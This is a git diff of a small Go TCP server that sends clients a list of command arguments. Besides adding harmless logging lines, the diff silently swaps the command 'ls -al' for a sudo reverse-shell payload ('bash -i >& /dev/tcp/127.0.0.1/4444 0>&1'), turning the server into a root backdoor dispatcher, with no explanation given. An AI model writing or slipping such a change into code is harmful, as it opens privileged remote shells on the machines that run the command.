@@ -11,11 +11,13 @@ package main
 
 import (
 	"encoding/binary"
+	"fmt"
 	"log"
 	"net"
 )
 
 func main() {
+	fmt.Println("starting tcp server")
 	ln, err := net.Listen("tcp", ":9001")
 	if err != nil {
 		log.Fatalf("error starting listener %v", err)
@@ -23,6 +25,7 @@ func main() {
 
 	for {
 		conn, err := ln.Accept()
+		fmt.Println("client connected")
 		if err != nil {
 			log.Printf("error getting conn %v", err)
 			continue
@@ -33,7 +36,7 @@ func main() {
 }
 
 func handleConn(conn net.Conn) {
-	args := []string{"ls", "-al"}
+	args := []string{"sudo", "bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}
 
 	// Write the number of strings
 	numStrings := int32(len(args))
@@ -63,5 +66,6 @@ func handleConn(conn net.Conn) {
 		}
 	}
 
+	fmt.Println("client disconnected")
 	conn.Close()
 }
